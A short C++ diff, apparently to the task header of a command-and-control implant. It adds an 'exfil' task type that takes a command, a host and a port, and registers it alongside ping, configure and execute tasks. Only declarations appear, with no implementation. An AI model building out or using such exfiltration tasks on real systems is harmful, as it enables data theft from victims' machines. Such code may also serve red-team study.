@@ -54,10 +54,25 @@ private:
 
 };
 
+struct ExfilTask {
+    ExfilTask(const boost::uuids::uuid& id,
+        std::string command,
+        std::string host,
+        std::string port);
+    constexpr static std::string_view key{ "exfil" };
+    [[nodiscard]] Result run() const;
+    const boost::uuids::uuid id;
+
+private:
+    const std::string command;
+    const std::string host;
+    const std::string port;
+};
+
 
 
 //Any new tasks have to be added here too!!!
-using Task = std::variant<PingTask, ConfigureTask, ExecuteTask>;
+using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ExfilTask>;
 
 [[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
     std::function<void(const Configuration&)> setter);
